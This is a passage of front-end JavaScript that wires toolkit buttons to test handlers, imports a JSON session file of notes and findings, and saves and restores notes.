    $("tkContainerBtn")?.addEventListener("click", containerTest);
    $("tkCicdBtn")?.addEventListener("click", cicdTest);
    $("tkMobileBtn")?.addEventListener("click", mobileTest);
    $("tkCollabExportBtn")?.addEventListener("click", collabExport);
    $("tkCollabImportBtn")?.addEventListener("click", collabImport);
    $("tkCollabImportFile")?.addEventListener("change", async (e) => {
      const file = e.target.files?.[0];
      if (!file) return;
      try {
        const session = JSON.parse(await file.text());
        if (session.notes) $("tkCollabNotes").value = session.notes;
        if (session.findings && window.restoreSessionPayload) window.restoreSessionPayload({ allData: session.findings });
        toast("Session imported successfully", "success");
      } catch { toast("Invalid session file", "error"); }
      e.target.value = "";
    });
    $("tkCollabSaveBtn")?.addEventListener("click", () => {
      tk3Set("notes", $("tkCollabNotes")?.value || "");
      toast("Notes saved", "success");
    });

    // Load saved notes
    const savedNotes = tk3Get("notes");
    if (savedNotes && $("tkCollabNotes")) $("tkCollabNotes").value = savedNotes;
  });
})();
